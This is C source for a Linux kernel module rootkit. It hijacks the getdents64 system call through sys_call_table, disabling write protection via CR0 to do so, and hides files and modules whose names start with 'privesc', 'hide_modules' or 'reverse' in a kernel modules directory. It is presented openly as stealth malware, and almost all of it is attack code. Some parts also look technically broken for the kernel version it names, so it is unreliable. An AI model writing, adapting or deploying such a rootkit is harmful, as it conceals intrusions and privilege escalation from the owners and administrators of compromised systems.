#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/kallsyms.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nathan, FL");
MODULE_DESCRIPTION("Stealthy Hide and Protect Multiple Modules and Files");
MODULE_VERSION("0.06");

#define TARGET_DIR "/lib/modules/6.10.10/"
#define HIDE_PREFIXES_SIZE 3

static char *hide_prefixes[HIDE_PREFIXES_SIZE] = {
    "privesc",
    "hide_modules",
    "reverse"
};

static asmlinkage long (*original_getdents64)(const struct pt_regs *);

static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
{
    int ret, bpos;
    struct linux_dirent64 *current_dir, *previous_dir = NULL, *dirent_buffer;
    struct fd f = fdget(regs->di);
    char *kernel_buffer;

    if (!f.file || strcmp(f.file->f_path.dentry->d_name.name, TARGET_DIR) != 0) {
        fdput(f);
        return original_getdents64(regs);
    }

    kernel_buffer = kzalloc((size_t)regs->dx, GFP_KERNEL);
    if (!kernel_buffer) {
        fdput(f);
        return -ENOMEM;
    }

    ret = original_getdents64(regs);
    if (ret <= 0) {
        kfree(kernel_buffer);
        fdput(f);
        return ret;
    }

    dirent_buffer = (struct linux_dirent64 *)kernel_buffer;
    copy_from_user(dirent_buffer, (void __user *)regs->si, (unsigned long)ret);

    bpos = 0;
    while (bpos < ret) {
        current_dir = (struct linux_dirent64 *)((char *)dirent_buffer + bpos);
        bool hide = false;

        for (int i = 0; i < HIDE_PREFIXES_SIZE; i++) {
            if (strncmp(current_dir->d_name, hide_prefixes[i], strlen(hide_prefixes[i])) == 0) {
                hide = true;
                break;
            }
        }

        if (hide) {
            if (previous_dir)
                previous_dir->d_reclen += current_dir->d_reclen;
            else
                ret -= current_dir->d_reclen;
        } else {
            previous_dir = current_dir;
        }

        bpos += current_dir->d_reclen;
    }

    copy_to_user((void __user *)regs->si, dirent_buffer, ret);
    kfree(kernel_buffer);
    fdput(f);

    return ret;
}

static int __init hide_modules_init(void)
{
    unsigned long address;

    address = kallsyms_lookup_name("sys_call_table");
    if (!address) {
        return -1;
    }

    original_getdents64 = ((void **)address)[__NR_getdents64];
    write_cr0(read_cr0() & (~0x10000));
    ((void **)address)[__NR_getdents64] = hooked_getdents64;
    write_cr0(read_cr0() | 0x10000);

    return 0;
}

static void __exit hide_modules_exit(void)
{
    unsigned long address;

    address = kallsyms_lookup_name("sys_call_table");
    if (!address) {
        return;
    }

    write_cr0(read_cr0() & (~0x10000));
    ((void **)address)[__NR_getdents64] = original_getdents64;
    write_cr0(read_cr0() | 0x10000);
}

module_init(hide_modules_init);
module_exit(hide_modules_exit);
